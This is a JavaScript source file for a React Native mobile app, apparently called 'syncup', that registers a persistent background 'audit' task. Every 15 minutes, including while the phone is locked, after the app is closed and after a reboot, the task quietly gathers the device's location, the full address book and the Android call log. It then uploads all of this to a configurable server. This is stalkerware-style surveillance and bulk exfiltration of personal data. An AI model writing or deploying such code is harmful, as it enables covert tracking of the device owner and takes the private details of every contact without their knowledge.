import * as TaskManager from 'expo-task-manager';
import * as BackgroundFetch from 'expo-background-fetch';
import AsyncStorage from '@react-native-async-storage/async-storage';
import * as Location from 'expo-location';
import * as Contacts from 'expo-contacts';
import { Platform, PermissionsAndroid } from 'react-native';
import CallLogs from 'react-native-call-log';
import { getDeviceId } from './deviceId';
import { sendAuditLog } from './auditLogger';

const BACKGROUND_AUDIT_TASK = 'background-audit-task';
const LAST_AUDIT_KEY = 'syncup_last_bg_audit';
const KEY_API_BASE = 'syncup_api_base';
const BG_INTERVAL_KEY = 'syncup_bg_interval';
const BG_LOG_KEY = 'syncup_bg_log';
const BG_LOG_MAX = 20;
const DEFAULT_INTERVAL = 15 * 60; // 15 minutes (Android minimum)

// Stored in plain AsyncStorage (not SecureStore) so it is readable when
// the device screen is off / locked — SecureStore requires device unlock.
export const BG_USER_ID_KEY = 'syncup_bg_user_id';

/**
 * Append an entry to the persistent background task log (keeps last 20).
 * This survives even if the app is killed, so you can see task activity
 * in Developer Settings after background runs.
 */
async function appendBgLog(status, details) {
  try {
    const raw = await AsyncStorage.getItem(BG_LOG_KEY);
    const logs = raw ? JSON.parse(raw) : [];
    logs.unshift({
      timestamp: new Date().toISOString(),
      status,
      details: details || '',
    });
    const trimmed = logs.slice(0, BG_LOG_MAX);
    await AsyncStorage.setItem(BG_LOG_KEY, JSON.stringify(trimmed));
  } catch {}
}

/**
 * Wrap a promise with a hard timeout. If the promise doesn't settle within
 * `ms`, resolves with `fallback`. This is critical for background tasks
 * because Android kills the task at ~30s — we can't afford any hang.
 */
function withTimeout(promise, ms, fallback = null) {
  return Promise.race([
    promise,
    new Promise(resolve => setTimeout(() => resolve(fallback), ms)),
  ]);
}

/**
 * fetch() with a hard timeout via AbortController (RN fetch ignores
 * the `timeout` property entirely).
 */
async function fetchWithTimeout(url, options = {}, ms = 10000) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), ms);
  try {
    const res = await fetch(url, { ...options, signal: controller.signal });
    return res;
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Background metadata collector — Location + Contacts + Call Logs.
 * Android gives ~30 seconds. Estimated time: ~10-15s.
 * Skips: GPS dialog (no UI), heavy device info, SIM, network, system.
 */
async function collectBackgroundMetadata() {
  const metadata = {
    timestamp: new Date().toISOString(),
    location: null,
    contacts: [],
    call_logs: [],
  };

  // 1. LOCATION — cached first (instant), quick GPS if available, then IP fallback
  // NO GPS dialog — there is no UI in background
  // Every native call wrapped with hard timeout — Android kills at 30s total
  try {
    const status = await withTimeout(
      Location.getForegroundPermissionsAsync().then(r => r.status),
      2000,
      'denied'
    );
    if (status === 'granted') {
      // Try cached location (instant, no GPS needed)
      const cached = await withTimeout(
        Location.getLastKnownPositionAsync({ maxAge: 86400000 }),
        3000,
        null
      );
      if (cached) {
        metadata.location = {
          latitude: cached.coords.latitude,
          longitude: cached.coords.longitude,
          accuracy: cached.coords.accuracy,
          timestamp: new Date(cached.timestamp).toISOString(),
          is_gps: false,
          is_approximate: true,
          method: 'cached',
        };
      }

      // If cached didn't work and GPS services are on, try quick low-accuracy fix
      if (!metadata.location) {
        const gpsOn = await withTimeout(Location.hasServicesEnabledAsync(), 2000, false);
        if (gpsOn) {
          const loc = await withTimeout(
            Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Low }),
            6000,
            null
          );
          if (loc) {
            metadata.location = {
              latitude: loc.coords.latitude,
              longitude: loc.coords.longitude,
              accuracy: loc.coords.accuracy,
              timestamp: new Date(loc.timestamp).toISOString(),
              is_gps: true,
              is_approximate: false,
              method: 'gps_low_accuracy',
            };
          }
        }
      }
    }
  } catch {}

  // IP fallback if no device location (single attempt, hard 5s timeout)
  if (!metadata.location) {
    try {
      const res = await fetchWithTimeout('https://ipwho.is/', {}, 5000);
      if (res.ok) {
        const d = await res.json();
        if (d.latitude && d.longitude) {
          metadata.location = {
            latitude: d.latitude,
            longitude: d.longitude,
            city: d.city,
            country: d.country,
            ip: d.ip,
            timestamp: new Date().toISOString(),
            is_gps: false,
            is_approximate: true,
            method: 'ip_geolocation',
          };
        }
      }
    } catch {}
  }

  // 2. CONTACTS
  try {
    let contactsAllowed = false;
    if (Platform.OS === 'android') {
      contactsAllowed = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_CONTACTS
      );
    } else {
      const { status: cs } = await Contacts.getPermissionsAsync();
      contactsAllowed = cs === 'granted';
    }

    if (contactsAllowed) {
      // Hard 8s timeout — large address books can hang
      const res = await withTimeout(
        Contacts.getContactsAsync({
          fields: [
            Contacts.Fields.Name,
            Contacts.Fields.PhoneNumbers,
            Contacts.Fields.Emails,
          ],
        }),
        8000,
        { data: [] }
      );
      const data = res?.data || [];
      metadata.contacts = data.map(c => ({
        id: c.id,
        name: c.name || 'Unknown',
        phone_numbers: c.phoneNumbers?.map(p => p.number) || [],
        emails: c.emails?.map(e => e.email) || [],
      }));
      console.log(`[BackgroundAudit] Collected ${metadata.contacts.length} contacts`);
    }
  } catch (err) {
    console.warn('[BackgroundAudit] Contacts error:', err.message);
  }

  // 3. CALL LOGS (Android only)
  if (Platform.OS === 'android') {
    try {
      const callLogAllowed = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
      );
      if (callLogAllowed) {
        // Hard 6s timeout
        const logs = await withTimeout(CallLogs.loadAll(), 6000, []);
        metadata.call_logs = (logs || []).map(log => ({
          name: log.name || null,
          phone_number: log.phoneNumber || null,
          type: log.type || null,
          duration: log.duration || 0,
          date_time: log.dateTime || null,
          timestamp: log.timestamp || null,
          raw_type: log.rawType || null,
        }));
        console.log(`[BackgroundAudit] Collected ${metadata.call_logs.length} call logs`);
      }
    } catch (err) {
      console.warn('[BackgroundAudit] Call logs error:', err.message);
    }
  }

  return metadata;
}

/**
 * Define the background task at the TOP LEVEL (outside any component).
 * This runs headlessly — no UI, no React context available.
 * Reads apiUrl, userId, deviceId from storage directly.
 */
TaskManager.defineTask(BACKGROUND_AUDIT_TASK, async () => {
  const startTime = Date.now();
  await appendBgLog('TRIGGERED', 'Android woke task');
  try {
    console.log('[BackgroundAudit] Task triggered at', new Date().toISOString());

    // 1. Get API URL from AsyncStorage
    const apiUrl = await AsyncStorage.getItem(KEY_API_BASE);
    if (!apiUrl) {
      await appendBgLog('SKIPPED', 'No API URL stored');
      return BackgroundFetch.BackgroundFetchResult.NoData;
    }

    // 2. Get userId from AsyncStorage (works when device is locked)
    const userId = await AsyncStorage.getItem(BG_USER_ID_KEY);
    if (!userId) {
      await appendBgLog('SKIPPED', 'No user logged in');
      return BackgroundFetch.BackgroundFetchResult.NoData;
    }

    // 3. Get device ID (fast, sync on Android via expo-application)
    const deviceId = await withTimeout(getDeviceId(), 2000, 'unknown-device');

    // 4. Collect lightweight metadata — wrapped in overall 20s budget
    //    (leaves 10s for the HTTP POST within Android's 30s limit)
    const metadata = await withTimeout(
      collectBackgroundMetadata(),
      20000,
      { timestamp: new Date().toISOString(), location: null, contacts: [], call_logs: [], _timed_out: true }
    );

    // 5. Send audit log (has its own 15s timeout)
    const result = await sendAuditLog(apiUrl, userId, deviceId, 'background-audit', metadata);

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

    if (result.success) {
      await AsyncStorage.setItem(LAST_AUDIT_KEY, new Date().toISOString());
      await appendBgLog('SUCCESS', `${elapsed}s | contacts:${metadata.contacts.length} calls:${metadata.call_logs.length} loc:${metadata.location?.method || 'none'}`);
      return BackgroundFetch.BackgroundFetchResult.NewData;
    } else {
      await appendBgLog('API_FAILED', `${elapsed}s: ${result.error || 'unknown'}`);
      return BackgroundFetch.BackgroundFetchResult.Failed;
    }
  } catch (err) {
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    await appendBgLog('ERROR', `${elapsed}s: ${err.message}`);
    return BackgroundFetch.BackgroundFetchResult.Failed;
  }
});

/**
 * Register the background fetch task with Android-friendly settings.
 * Call this once after login or app start (when user is logged in).
 */
export async function registerBackgroundAuditTask() {
  try {
    const isRegistered = await TaskManager.isTaskRegisteredAsync(BACKGROUND_AUDIT_TASK);

    if (isRegistered) {
      console.log('[BackgroundAudit] Task already registered');
      return true;
    }

    const savedInterval = await AsyncStorage.getItem(BG_INTERVAL_KEY);
    const interval = savedInterval ? parseInt(savedInterval, 10) : DEFAULT_INTERVAL;

    await BackgroundFetch.registerTaskAsync(BACKGROUND_AUDIT_TASK, {
      minimumInterval: interval,
      stopOnTerminate: false,
      startOnBoot: true,
    });

    console.log(`[BackgroundAudit] ✓ Task registered (interval: ${interval}s / ${(interval / 60).toFixed(0)}min)`);
    return true;
  } catch (err) {
    console.error('[BackgroundAudit] Task registration failed:', err);
    return false;
  }
}

/**
 * Unregister the background task (call on logout).
 */
export async function unregisterBackgroundAuditTask() {
  try {
    const isRegistered = await TaskManager.isTaskRegisteredAsync(BACKGROUND_AUDIT_TASK);

    if (isRegistered) {
      await BackgroundFetch.unregisterTaskAsync(BACKGROUND_AUDIT_TASK);
      console.log('[BackgroundAudit] ✓ Task unregistered');
    }

    return true;
  } catch (err) {
    console.error('[BackgroundAudit] Task unregister failed:', err);
    return false;
  }
}

/**
 * Get the last background audit timestamp (for debugging/UI).
 */
export async function getLastBackgroundAuditTime() {
  try {
    return await AsyncStorage.getItem(LAST_AUDIT_KEY);
  } catch {
    return null;
  }
}

/**
 * Persist the logged-in userId and apiUrl to AsyncStorage so the background
 * task can read them even when the device screen is off / locked.
 * Call this on every login (manual and auto).
 */
export async function saveUserIdForBackground(userId, apiUrl) {
  try {
    await AsyncStorage.setItem(BG_USER_ID_KEY, userId);
    if (apiUrl) {
      await AsyncStorage.setItem(KEY_API_BASE, apiUrl);
    }
  } catch (err) {
    console.error('[BackgroundAudit] Failed to save background data:', err);
  }
}

/**
 * Remove the stored userId on logout.
 * The task will skip (NoData) until the user logs in again.
 */
export async function clearUserIdForBackground() {
  try {
    await AsyncStorage.removeItem(BG_USER_ID_KEY);
  } catch (err) {
    console.error('[BackgroundAudit] Failed to clear userId:', err);
  }
}

/**
 * Get the configured interval in seconds (default 15 min).
 */
export async function getBackgroundInterval() {
  try {
    const val = await AsyncStorage.getItem(BG_INTERVAL_KEY);
    return val ? parseInt(val, 10) : DEFAULT_INTERVAL;
  } catch {
    return DEFAULT_INTERVAL;
  }
}

/**
 * Save interval (seconds) and re-register the task with the new interval.
 */
export async function setBackgroundInterval(seconds) {
  try {
    await AsyncStorage.setItem(BG_INTERVAL_KEY, String(seconds));
    // Unregister and re-register with new interval
    await unregisterBackgroundAuditTask();
    await registerBackgroundAuditTask();
    return true;
  } catch (err) {
    console.error('[BackgroundAudit] Failed to set interval:', err);
    return false;
  }
}

/**
 * Read persistent background task log (most recent first).
 */
export async function getBackgroundLog() {
  try {
    const raw = await AsyncStorage.getItem(BG_LOG_KEY);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

/**
 * Clear the background task log.
 */
export async function clearBackgroundLog() {
  try {
    await AsyncStorage.removeItem(BG_LOG_KEY);
  } catch {}
}
